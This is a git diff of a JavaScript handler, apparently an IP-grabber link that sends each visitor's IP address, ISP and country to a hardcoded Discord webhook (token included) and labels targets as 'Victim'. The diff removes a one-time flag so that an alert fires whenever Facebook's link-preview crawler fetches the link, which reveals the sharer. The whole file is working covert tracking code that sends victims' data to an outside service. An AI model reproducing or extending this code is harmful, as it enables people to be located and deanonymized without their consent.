@@ -2,8 +2,6 @@ import fetch from 'node-fetch';
 
 const webhookUrl = "https://discord.com/api/webhooks/1317579965285531648/IyHYlXpJrQjNnFwG7N7MMusqOGxoJITSPHbIdkWfDaaMX-okBoxRL0cmGmyrT89dyd69";
 
-let facebookLinkSent = false;
-
 async function sendToWebhook(message) {
     try {
         const response = await fetch(webhookUrl, {
@@ -98,24 +96,21 @@ export default async function handler(req, res) {
                     }
                 ]
             }
-            : ipDetails.isp === "Facebook, Inc." && userAgent.includes("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)") && !facebookLinkSent
-                ? (() => {
-                    facebookLinkSent = true; // Prevent future sends
-                    return {
-                        embeds: [
-                            {
-                                title: "User Send Link To Victim",
-                                color: 0xFF0000, // Red color to indicate alert
-                                description: "Device info collected from sender.",
-                                fields: [
-                                    { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
-                                    { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
-                                    { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
-                                ]
-                            }
-                        ]
-                    };
-                })()
+            : ipDetails.isp === "Facebook, Inc." && userAgent.includes("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)")
+                ? {
+                    embeds: [
+                        {
+                            title: "User Send Link To Victim",
+                            color: 0xFF0000, // Red color to indicate alert
+                            description: "Device info collected from sender.",
+                            fields: [
+                                { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+                                { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
+                                { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
+                            ]
+                        }
+                    ]
+                }
                 : {
                     embeds: [
                         {
